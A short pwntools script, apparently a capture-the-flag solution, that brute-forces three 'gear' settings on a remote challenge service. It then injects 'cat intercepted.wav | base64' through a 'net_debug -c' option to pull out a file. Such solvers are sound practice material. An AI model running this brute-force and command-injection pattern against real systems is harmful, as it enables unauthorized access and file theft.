from pwn import *
import time
r = remote('13.38.118.229', 1337)

print(r.recvuntil(">>"))
r.sendline("actions")
initial_actions = r.recvuntil(">>")
print(initial_actions)

op = [1, 2, 3]
catched = False
for o in op:
	for d in op:
		for i in op:
			print("Testing: ",o,d,i)
			r.sendline("gear -o " + str(o))
			print(r.recvuntil(">>"))
			r.sendline("gear -d " + str(d))
			print(r.recvuntil(">>"))
			r.sendline("gear -i " + str(i))
			print(r.recvuntil(">>"))
			r.sendline("actions")
			new_actions = r.recvuntil(">>")
			print(new_actions)
			if new_actions != initial_actions:
				print("Valid config: ",o,d,i)
				catched = True
				break
		if catched:
			break
	if catched:
		break
			
r.sendline("net_debug -c cat intercepted.wav | base64")
fichero=r.recvuntil(">>")
print(fichero.strip())				
			
